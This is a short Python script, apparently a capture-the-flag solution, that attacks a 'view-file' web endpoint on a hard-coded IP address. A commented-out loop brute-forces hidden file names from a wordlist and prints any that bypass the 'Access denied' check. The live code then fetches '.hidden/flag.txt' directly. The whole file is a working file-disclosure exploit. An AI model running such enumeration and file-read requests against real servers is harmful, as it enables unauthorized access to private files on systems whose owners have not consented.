import requests

"""
with open("wordlist.txt", "r") as f:
    for line in f:
        candidate = line.rstrip()

        if not candidate.startswith("."):
            candidate = "." + candidate

        resp = requests.get(f'http://34.135.223.176:10404/view-file?file={candidate}')
        if not resp.text.startswith("Error: Access denied"):
            print(candidate, resp.text)
"""

my_url = f'http://34.135.223.176:10404/view-file?file=.hidden/flag.txt'
resp = requests.get(my_url)
print(resp.text)
